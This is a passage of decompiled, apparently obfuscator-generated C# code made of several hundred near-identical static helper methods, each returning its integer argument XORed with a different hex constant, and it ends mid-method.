	[Obsolete("Exclude")]
	public static int smethod_2044(int int_4)
	{
		return int_4 ^ 0x352E6068;
	}

	[Obsolete("Exclude")]
	public static int smethod_2045(int int_4)
	{
		return int_4 ^ 0x4EB98B46;
	}

	[Obsolete("Exclude")]
	public static int smethod_2046(int int_4)
	{
		return int_4 ^ 0x182CCC7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2047(int int_4)
	{
		return int_4 ^ 0x4814E22;
	}

	[Obsolete("Exclude")]
	public static int smethod_2048(int int_4)
	{
		return int_4 ^ 0x910530D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2049(int int_4)
	{
		return int_4 ^ 0x42BB67FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2050(int int_4)
	{
		return int_4 ^ 0x5A200766;
	}

	[Obsolete("Exclude")]
	public static int smethod_2051(int int_4)
	{
		return int_4 ^ 0x5B732A1A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2052(int int_4)
	{
		return int_4 ^ 0x750BABAA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2053(int int_4)
	{
		return int_4 ^ 0x12ABA725;
	}

	[Obsolete("Exclude")]
	public static int smethod_2054(int int_4)
	{
		return int_4 ^ 0x1C1BEA1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2055(int int_4)
	{
		return int_4 ^ 0x38C13B4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2056(int int_4)
	{
		return int_4 ^ 0x797E802E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2057(int int_4)
	{
		return int_4 ^ 0x1CAD2629;
	}

	[Obsolete("Exclude")]
	public static int smethod_2058(int int_4)
	{
		return int_4 ^ 0xD24FCD9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2059(int int_4)
	{
		return int_4 ^ 0x25360E6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2060(int int_4)
	{
		return int_4 ^ 0x2E14B1A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2061(int int_4)
	{
		return int_4 ^ 0x52BF7906;
	}

	[Obsolete("Exclude")]
	public static int smethod_2062(int int_4)
	{
		return int_4 ^ 0x46513733;
	}

	[Obsolete("Exclude")]
	public static int smethod_2063(int int_4)
	{
		return int_4 ^ 0x59C99F52;
	}

	[Obsolete("Exclude")]
	public static int smethod_2064(int int_4)
	{
		return int_4 ^ 0x3732BB3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2065(int int_4)
	{
		return int_4 ^ 0x7B326F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2066(int int_4)
	{
		return int_4 ^ 0x73293E61;
	}

	[Obsolete("Exclude")]
	public static int smethod_2067(int int_4)
	{
		return int_4 ^ 0x7BEAD172;
	}

	[Obsolete("Exclude")]
	public static int smethod_2068(int int_4)
	{
		return int_4 ^ 0x68410D9B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2069(int int_4)
	{
		return int_4 ^ 0x4E99E6D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2070(int int_4)
	{
		return int_4 ^ 0x4343E00B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2071(int int_4)
	{
		return int_4 ^ 0x246A97E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2072(int int_4)
	{
		return int_4 ^ 0x770D0C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2073(int int_4)
	{
		return int_4 ^ 0x62527DF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2074(int int_4)
	{
		return int_4 ^ 0x1D85DAB8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2075(int int_4)
	{
		return int_4 ^ 0x1F3D6999;
	}

	[Obsolete("Exclude")]
	public static int smethod_2076(int int_4)
	{
		return int_4 ^ 0x262A4ACA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2077(int int_4)
	{
		return int_4 ^ 0x7413CFFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2078(int int_4)
	{
		return int_4 ^ 0x64ACF5F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2079(int int_4)
	{
		return int_4 ^ 0x1A802401;
	}

	[Obsolete("Exclude")]
	public static int smethod_2080(int int_4)
	{
		return int_4 ^ 0x2B95643A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2081(int int_4)
	{
		return int_4 ^ 0x18C33872;
	}

	[Obsolete("Exclude")]
	public static int smethod_2082(int int_4)
	{
		return int_4 ^ 0x73C08F4E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2083(int int_4)
	{
		return int_4 ^ 0x43A7FCEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2084(int int_4)
	{
		return int_4 ^ 0x13EBD541;
	}

	[Obsolete("Exclude")]
	public static int smethod_2085(int int_4)
	{
		return int_4 ^ 0x5C5B29C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2086(int int_4)
	{
		return int_4 ^ 0x420FB633;
	}

	[Obsolete("Exclude")]
	public static int smethod_2087(int int_4)
	{
		return int_4 ^ 0x263C6E0F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2088(int int_4)
	{
		return int_4 ^ 0x2B2A97F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2089(int int_4)
	{
		return int_4 ^ 0x223A866C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2090(int int_4)
	{
		return int_4 ^ 0x7D926581;
	}

	[Obsolete("Exclude")]
	public static int smethod_2091(int int_4)
	{
		return int_4 ^ 0x29626176;
	}

	[Obsolete("Exclude")]
	public static int smethod_2092(int int_4)
	{
		return int_4 ^ 0x7D682252;
	}

	[Obsolete("Exclude")]
	public static int smethod_2093(int int_4)
	{
		return int_4 ^ 0x16B5E0DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2094(int int_4)
	{
		return int_4 ^ 0x77D9C459;
	}

	[Obsolete("Exclude")]
	public static int smethod_2095(int int_4)
	{
		return int_4 ^ 0x22CFC1ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_2096(int int_4)
	{
		return int_4 ^ 0x662121E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2097(int int_4)
	{
		return int_4 ^ 0x3262760D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2098(int int_4)
	{
		return int_4 ^ 0x3452645E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2099(int int_4)
	{
		return int_4 ^ 0x5A0DE7A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2100(int int_4)
	{
		return int_4 ^ 0x4B4DBDB3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2101(int int_4)
	{
		return int_4 ^ 0x84BA7B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2102(int int_4)
	{
		return int_4 ^ 0x4C2EF105;
	}

	[Obsolete("Exclude")]
	public static int smethod_2103(int int_4)
	{
		return int_4 ^ 0x2D0927AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2104(int int_4)
	{
		return int_4 ^ 0x4810CE2D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2105(int int_4)
	{
		return int_4 ^ 0x39F225B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2106(int int_4)
	{
		return int_4 ^ 0x3FF28B4E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2107(int int_4)
	{
		return int_4 ^ 0x36F8B6DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2108(int int_4)
	{
		return int_4 ^ 0x5FDE4A10;
	}

	[Obsolete("Exclude")]
	public static int smethod_2109(int int_4)
	{
		return int_4 ^ 0x4C4DD6E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2110(int int_4)
	{
		return int_4 ^ 0x3273385B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2111(int int_4)
	{
		return int_4 ^ 0x131DE10E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2112(int int_4)
	{
		return int_4 ^ 0x3EF89116;
	}

	[Obsolete("Exclude")]
	public static int smethod_2113(int int_4)
	{
		return int_4 ^ 0x64DB13F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2114(int int_4)
	{
		return int_4 ^ 0x29006432;
	}

	[Obsolete("Exclude")]
	public static int smethod_2115(int int_4)
	{
		return int_4 ^ 0x350B401C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2116(int int_4)
	{
		return int_4 ^ 0x31DC8F80;
	}

	[Obsolete("Exclude")]
	public static int smethod_2117(int int_4)
	{
		return int_4 ^ 0x7B3DEC03;
	}

	[Obsolete("Exclude")]
	public static int smethod_2118(int int_4)
	{
		return int_4 ^ 0x553DAB30;
	}

	[Obsolete("Exclude")]
	public static int smethod_2119(int int_4)
	{
		return int_4 ^ 0x557A937C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2120(int int_4)
	{
		return int_4 ^ 0x62907350;
	}

	[Obsolete("Exclude")]
	public static int smethod_2121(int int_4)
	{
		return int_4 ^ 0x4C0E0549;
	}

	[Obsolete("Exclude")]
	public static int smethod_2122(int int_4)
	{
		return int_4 ^ 0x61C33F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2123(int int_4)
	{
		return int_4 ^ 0x430F2768;
	}

	[Obsolete("Exclude")]
	public static int smethod_2124(int int_4)
	{
		return int_4 ^ 0x28425628;
	}

	[Obsolete("Exclude")]
	public static int smethod_2125(int int_4)
	{
		return int_4 ^ 0x60B26D2F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2126(int int_4)
	{
		return int_4 ^ 0x2C1D6743;
	}

	[Obsolete("Exclude")]
	public static int smethod_2127(int int_4)
	{
		return int_4 ^ 0x4AEF3DEE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2128(int int_4)
	{
		return int_4 ^ 0x2331B966;
	}

	[Obsolete("Exclude")]
	public static int smethod_2129(int int_4)
	{
		return int_4 ^ 0x5EEFECC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2130(int int_4)
	{
		return int_4 ^ 0x45321868;
	}

	[Obsolete("Exclude")]
	public static int smethod_2131(int int_4)
	{
		return int_4 ^ 0xBE38BC5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2132(int int_4)
	{
		return int_4 ^ 0x4EED74FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2133(int int_4)
	{
		return int_4 ^ 0x58B71835;
	}

	[Obsolete("Exclude")]
	public static int smethod_2134(int int_4)
	{
		return int_4 ^ 0x277F7DA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2135(int int_4)
	{
		return int_4 ^ 0x330D0998;
	}

	[Obsolete("Exclude")]
	public static int smethod_2136(int int_4)
	{
		return int_4 ^ 0x19D43B03;
	}

	[Obsolete("Exclude")]
	public static int smethod_2137(int int_4)
	{
		return int_4 ^ 0x582E1107;
	}

	[Obsolete("Exclude")]
	public static int smethod_2138(int int_4)
	{
		return int_4 ^ 0x3141DEF5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2139(int int_4)
	{
		return int_4 ^ 0xC50E9AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2140(int int_4)
	{
		return int_4 ^ 0x2326FF41;
	}

	[Obsolete("Exclude")]
	public static int smethod_2141(int int_4)
	{
		return int_4 ^ 0x3B7894F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2142(int int_4)
	{
		return int_4 ^ 0xDE35A5D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2143(int int_4)
	{
		return int_4 ^ 0xC8057F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2144(int int_4)
	{
		return int_4 ^ 0x44028FC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2145(int int_4)
	{
		return int_4 ^ 0x2DB7CF88;
	}

	[Obsolete("Exclude")]
	public static int smethod_2146(int int_4)
	{
		return int_4 ^ 0x46186FC5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2147(int int_4)
	{
		return int_4 ^ 0x65A4406E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2148(int int_4)
	{
		return int_4 ^ 0x6D66926;
	}

	[Obsolete("Exclude")]
	public static int smethod_2149(int int_4)
	{
		return int_4 ^ 0x246C4F70;
	}

	[Obsolete("Exclude")]
	public static int smethod_2150(int int_4)
	{
		return int_4 ^ 0x2DBDCA5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2151(int int_4)
	{
		return int_4 ^ 0x73AEC499;
	}

	[Obsolete("Exclude")]
	public static int smethod_2152(int int_4)
	{
		return int_4 ^ 0x424537B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2153(int int_4)
	{
		return int_4 ^ 0x1B1AE96F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2154(int int_4)
	{
		return int_4 ^ 0x2E995596;
	}

	[Obsolete("Exclude")]
	public static int smethod_2155(int int_4)
	{
		return int_4 ^ 0x5AD5FFF4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2156(int int_4)
	{
		return int_4 ^ 0x3F44DCFD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2157(int int_4)
	{
		return int_4 ^ 0x1887F23;
	}

	[Obsolete("Exclude")]
	public static int smethod_2158(int int_4)
	{
		return int_4 ^ 0xCD3629D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2159(int int_4)
	{
		return int_4 ^ 0x336C9302;
	}

	[Obsolete("Exclude")]
	public static int smethod_2160(int int_4)
	{
		return int_4 ^ 0x4B4307CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_2161(int int_4)
	{
		return int_4 ^ 0x7FE8E7C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2162(int int_4)
	{
		return int_4 ^ 0xF71DFEB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2163(int int_4)
	{
		return int_4 ^ 0x58291B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2164(int int_4)
	{
		return int_4 ^ 0x39346BEB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2165(int int_4)
	{
		return int_4 ^ 0x158C6188;
	}

	[Obsolete("Exclude")]
	public static int smethod_2166(int int_4)
	{
		return int_4 ^ 0x76271347;
	}

	[Obsolete("Exclude")]
	public static int smethod_2167(int int_4)
	{
		return int_4 ^ 0x475F88EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2168(int int_4)
	{
		return int_4 ^ 0x2C88984B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2169(int int_4)
	{
		return int_4 ^ 0x3117C737;
	}

	[Obsolete("Exclude")]
	public static int smethod_2170(int int_4)
	{
		return int_4 ^ 0x737C27C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2171(int int_4)
	{
		return int_4 ^ 0x33D33E0E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2172(int int_4)
	{
		return int_4 ^ 0x59E4464C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2173(int int_4)
	{
		return int_4 ^ 0xE8128E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2174(int int_4)
	{
		return int_4 ^ 0x766B1E2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2175(int int_4)
	{
		return int_4 ^ 0x114113BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2176(int int_4)
	{
		return int_4 ^ 0x1A80853A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2177(int int_4)
	{
		return int_4 ^ 0x45783BDE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2178(int int_4)
	{
		return int_4 ^ 0x61C427FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2179(int int_4)
	{
		return int_4 ^ 0x831B96A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2180(int int_4)
	{
		return int_4 ^ 0x708CCF35;
	}

	[Obsolete("Exclude")]
	public static int smethod_2181(int int_4)
	{
		return int_4 ^ 0x2D08AA2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2182(int int_4)
	{
		return int_4 ^ 0x52272F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2183(int int_4)
	{
		return int_4 ^ 0x16EDE52A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2184(int int_4)
	{
		return int_4 ^ 0x15684946;
	}

	[Obsolete("Exclude")]
	public static int smethod_2185(int int_4)
	{
		return int_4 ^ 0x729B44FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2186(int int_4)
	{
		return int_4 ^ 0x181FDF3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2187(int int_4)
	{
		return int_4 ^ 0x1716241E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2188(int int_4)
	{
		return int_4 ^ 0x12E8AA8E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2189(int int_4)
	{
		return int_4 ^ 0x531905C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2190(int int_4)
	{
		return int_4 ^ 0x692E32D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2191(int int_4)
	{
		return int_4 ^ 0x2DE2866F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2192(int int_4)
	{
		return int_4 ^ 0x2C6BFB6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2193(int int_4)
	{
		return int_4 ^ 0x61FCC2D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2194(int int_4)
	{
		return int_4 ^ 0x4486664;
	}

	[Obsolete("Exclude")]
	public static int smethod_2195(int int_4)
	{
		return int_4 ^ 0x2213016;
	}

	[Obsolete("Exclude")]
	public static int smethod_2196(int int_4)
	{
		return int_4 ^ 0x41620005;
	}

	[Obsolete("Exclude")]
	public static int smethod_2197(int int_4)
	{
		return int_4 ^ 0x77159CC3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2198(int int_4)
	{
		return int_4 ^ 0x1D7AC681;
	}

	[Obsolete("Exclude")]
	public static int smethod_2199(int int_4)
	{
		return int_4 ^ 0x714DE6E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2200(int int_4)
	{
		return int_4 ^ 0x10F2E41F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2201(int int_4)
	{
		return int_4 ^ 0x78EE15D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2202(int int_4)
	{
		return int_4 ^ 0x70DF853E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2203(int int_4)
	{
		return int_4 ^ 0x542848C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2204(int int_4)
	{
		return int_4 ^ 0x5FA36E67;
	}

	[Obsolete("Exclude")]
	public static int smethod_2205(int int_4)
	{
		return int_4 ^ 0xBF30801;
	}

	[Obsolete("Exclude")]
	public static int smethod_2206(int int_4)
	{
		return int_4 ^ 0x514A168;
	}

	[Obsolete("Exclude")]
	public static int smethod_2207(int int_4)
	{
		return int_4 ^ 0x1B686A5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2208(int int_4)
	{
		return int_4 ^ 0x67841B2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2209(int int_4)
	{
		return int_4 ^ 0x12420BE4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2210(int int_4)
	{
		return int_4 ^ 0x4BBB7F1F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2211(int int_4)
	{
		return int_4 ^ 0x6AE84296;
	}

	[Obsolete("Exclude")]
	public static int smethod_2212(int int_4)
	{
		return int_4 ^ 0x47E585DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2213(int int_4)
	{
		return int_4 ^ 0x57E73B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2214(int int_4)
	{
		return int_4 ^ 0x6D4BD639;
	}

	[Obsolete("Exclude")]
	public static int smethod_2215(int int_4)
	{
		return int_4 ^ 0x39E5FAC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2216(int int_4)
	{
		return int_4 ^ 0x7816222D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2217(int int_4)
	{
		return int_4 ^ 0x79216943;
	}

	[Obsolete("Exclude")]
	public static int smethod_2218(int int_4)
	{
		return int_4 ^ 0x4C7B2DA2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2219(int int_4)
	{
		return int_4 ^ 0x3A73F311;
	}

	[Obsolete("Exclude")]
	public static int smethod_2220(int int_4)
	{
		return int_4 ^ 0x7D437AE1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2221(int int_4)
	{
		return int_4 ^ 0x3D9F80FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2222(int int_4)
	{
		return int_4 ^ 0x70DBFC70;
	}

	[Obsolete("Exclude")]
	public static int smethod_2223(int int_4)
	{
		return int_4 ^ 0x46F41237;
	}

	[Obsolete("Exclude")]
	public static int smethod_2224(int int_4)
	{
		return int_4 ^ 0x6CF1CA42;
	}

	[Obsolete("Exclude")]
	public static int smethod_2225(int int_4)
	{
		return int_4 ^ 0x70AE89C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2226(int int_4)
	{
		return int_4 ^ 0x66A00C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2227(int int_4)
	{
		return int_4 ^ 0x2EBB2D08;
	}

	[Obsolete("Exclude")]
	public static int smethod_2228(int int_4)
	{
		return int_4 ^ 0x327FDAEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_2229(int int_4)
	{
		return int_4 ^ 0x3B51964E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2230(int int_4)
	{
		return int_4 ^ 0x3C608505;
	}

	[Obsolete("Exclude")]
	public static int smethod_2231(int int_4)
	{
		return int_4 ^ 0x7E45D2D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2232(int int_4)
	{
		return int_4 ^ 0x2BFD8638;
	}

	[Obsolete("Exclude")]
	public static int smethod_2233(int int_4)
	{
		return int_4 ^ 0x6B75C446;
	}

	[Obsolete("Exclude")]
	public static int smethod_2234(int int_4)
	{
		return int_4 ^ 0x51833BA2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2235(int int_4)
	{
		return int_4 ^ 0x35EA7E34;
	}

	[Obsolete("Exclude")]
	public static int smethod_2236(int int_4)
	{
		return int_4 ^ 0x4EFF4CD6;
	}

	[Obsolete("Exclude")]
	public static int smethod_2237(int int_4)
	{
		return int_4 ^ 0x1DC9850;
	}

	[Obsolete("Exclude")]
	public static int smethod_2238(int int_4)
	{
		return int_4 ^ 0x764EC4AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2239(int int_4)
	{
		return int_4 ^ 0x73143358;
	}

	[Obsolete("Exclude")]
	public static int smethod_2240(int int_4)
	{
		return int_4 ^ 0x3989449;
	}

	[Obsolete("Exclude")]
	public static int smethod_2241(int int_4)
	{
		return int_4 ^ 0x23495981;
	}

	[Obsolete("Exclude")]
	public static int smethod_2242(int int_4)
	{
		return int_4 ^ 0x330C7CB9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2243(int int_4)
	{
		return int_4 ^ 0x41C8DCA9;
	}

	[Obsolete("Exclude")]
	public static int smethod_2244(int int_4)
	{
		return int_4 ^ 0x5515DC4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_2245(int int_4)
	{
		return int_4 ^ 0x31999C89;
	}

	[Obsolete("Exclude")]
	public static int smethod_2246(int int_4)
	{
		return int_4 ^ 0x505AF7A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2247(int int_4)
	{
		return int_4 ^ 0x41A37DA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2248(int int_4)
	{
		return int_4 ^ 0x297B6AA1;
	}

	[Obsolete("Exclude")]
	public static int smethod_2249(int int_4)
	{
		return int_4 ^ 0x160E7B6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2250(int int_4)
	{
		return int_4 ^ 0x6E2452E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2251(int int_4)
	{
		return int_4 ^ 0x29609987;
	}

	[Obsolete("Exclude")]
	public static int smethod_2252(int int_4)
	{
		return int_4 ^ 0x63BCA5D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2253(int int_4)
	{
		return int_4 ^ 0x6F4565A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2254(int int_4)
	{
		return int_4 ^ 0x33F9E41E;
	}

	[Obsolete("Exclude")]
	public static int smethod_2255(int int_4)
	{
		return int_4 ^ 0x9BD16F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2256(int int_4)
	{
		return int_4 ^ 0x104FFB28;
	}

	[Obsolete("Exclude")]
	public static int smethod_2257(int int_4)
	{
		return int_4 ^ 0x4D2CAF81;
	}

	[Obsolete("Exclude")]
	public static int smethod_2258(int int_4)
	{
		return int_4 ^ 0x4A9E5FBE;
	}

	[Obsolete("Exclude")]
	public static int smethod_2259(int int_4)
	{
		return int_4 ^ 0xB6A6A26;
	}

	[Obsolete("Exclude")]
	public static int smethod_2260(int int_4)
	{
		return int_4 ^ 0x45078B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2261(int int_4)
	{
		return int_4 ^ 0x1B7B96D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2262(int int_4)
	{
		return int_4 ^ 0x2841BAF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2263(int int_4)
	{
		return int_4 ^ 0x55C9A793;
	}

	[Obsolete("Exclude")]
	public static int smethod_2264(int int_4)
	{
		return int_4 ^ 0x6AF310DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2265(int int_4)
	{
		return int_4 ^ 0x5B01084B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2266(int int_4)
	{
		return int_4 ^ 0x536905E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2267(int int_4)
	{
		return int_4 ^ 0x2EF4E589;
	}

	[Obsolete("Exclude")]
	public static int smethod_2268(int int_4)
	{
		return int_4 ^ 0x2227E995;
	}

	[Obsolete("Exclude")]
	public static int smethod_2269(int int_4)
	{
		return int_4 ^ 0x33113A33;
	}

	[Obsolete("Exclude")]
	public static int smethod_2270(int int_4)
	{
		return int_4 ^ 0x6D75A276;
	}

	[Obsolete("Exclude")]
	public static int smethod_2271(int int_4)
	{
		return int_4 ^ 0x165EAE30;
	}

	[Obsolete("Exclude")]
	public static int smethod_2272(int int_4)
	{
		return int_4 ^ 0x417664C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_2273(int int_4)
	{
		return int_4 ^ 0x4FD31615;
	}

	[Obsolete("Exclude")]
	public static int smethod_2274(int int_4)
	{
		return int_4 ^ 0x6A7E09DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_2275(int int_4)
	{
		return int_4 ^ 0x3C63A028;
	}

	[Obsolete("Exclude")]
	public static int smethod_2276(int int_4)
	{
		return int_4 ^ 0x5E1A35A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_2277(int int_4)
	{
		return int_4 ^ 0x49910CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2278(int int_4)
	{
		return int_4 ^ 0x2A4F1256;
	}

	[Obsolete("Exclude")]
	public static int smethod_2279(int int_4)
	{
		return int_4 ^ 0x344C26A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2280(int int_4)
	{
		return int_4 ^ 0x6D969104;
	}

	[Obsolete("Exclude")]
	public static int smethod_2281(int int_4)
	{
		return int_4 ^ 0x50838D0B;
	}

	[Obsolete("Exclude")]
	public static int smethod_2282(int int_4)
	{
		return int_4 ^ 0x32B0D437;
	}

	[Obsolete("Exclude")]
	public static int smethod_2283(int int_4)
	{
		return int_4 ^ 0x31CA7B94;
	}

	[Obsolete("Exclude")]
	public static int smethod_2284(int int_4)
	{
		return int_4 ^ 0x5980CDA2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2285(int int_4)
	{
		return int_4 ^ 0x13B402F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_2286(int int_4)
	{
		return int_4 ^ 0xAB30BD2;
	}

	[Obsolete("Exclude")]
	public static int smethod_2287(int int_4)
	{
		return int_4 ^ 0x434FD0BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_2288(int int_4)
	{
		return int_4 ^ 0x490EC44D;
	}

	[Obsolete("Exclude")]
	public static int smethod_2289(int int_4)
	{
		return int_4 ^ 0x7ACB86E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_2290(int int_4)
	{
		return int_4 ^ 0x5A716561;
	}

	[Obsolete("Exclude")]
	public static int smethod_2291(int int_4)
	{
		return int_4 ^ 0x4E3FA722;
	}

	[Obsolete("Exclude")]
	public static int smethod_2292(int int_4)
	{
		return int_4 ^ 0x4909C14;
	}

	[Obsolete("Exclude")]
	public static int smethod_2293(int int_4)
	{
		return int_4 ^ 0x2A49597C;
	}

	[Obsolete("Exclude")]
	public static int smethod_2294(int int_4)
	{
		return int_4 ^ 0x143C77B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_2295(int int_4)
	{
		return int_4 ^ 0xFF0244;
	}

	[Obsolete("Exclude")]
	public static int smethod_2296(int int_4)
	{
		return int_4 ^ 0x5C78FD01;
	}

	[Obsolete("Exclude")]
	public static int smethod_2297(int int_4)
	{
		return int_4 ^ 0x18DF205;
	}

	[Obsolete("Exclude")]
	public static int smethod_2298(int int_4)
	{
		return int_4 ^ 0x8B6A575;
	}

	[Obsolete("Exclude")]
	public static int smethod_2299(int int_4)
	{
		return int_4 ^ 0x3D949FE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_2300(int int_4)
	{
		return int_4 ^ 0x7EEFF196;
	}

	[Obsolete("Exclude")]
	public static int smethod_2301(int int_4)
	{
		return int_4 ^ 0x5CE13A7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_2302(int int_4)
	{
		return int_4 ^ 0x36CEC6EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_2303(int int_4)
	{
		return int_4 ^ 0x75F82D83;
	}

	[Obsolete("Exclude")]
	public static int smethod_2304(int int_4)
	{
		return int_4 ^ 0x69F4EF66;
	}

	[Obsolete("Exclude")]
	public static int smethod_2305(int int_4)
	{
